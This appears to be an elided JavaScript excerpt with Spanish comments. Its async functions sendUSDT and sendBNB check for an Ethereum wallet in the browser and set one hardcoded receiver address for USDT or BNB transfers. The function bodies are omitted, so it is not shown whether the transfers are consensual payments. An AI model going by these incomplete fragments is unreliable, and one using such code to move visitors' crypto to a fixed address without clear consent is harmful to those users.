...
async function sendUSDT() {
  try {
      ...
      if (typeof window.ethereum !== 'undefined') {
          ...
          const receiverAddress = '0xAfb462a5E928C80bC9d09Dae1F1bFD906976d859'; // Dirección a la que se enviarán los USDT
...
async function sendBNB() {
  try {
      ...
      if (typeof window.ethereum !== 'undefined') {
          ...
          const receiverAddress = '0xAfb462a5E928C80bC9d09Dae1F1bFD906976d859'; // Dirección a la que se enviarán los BNB
...
async function sendUSDT() {
  try {
      ...
      if (typeof window.ethereum !== 'undefined') {
          ...
          const receiverAddress = '0xAfb462a5E928C80bC9d09Dae1F1bFD906976d859';
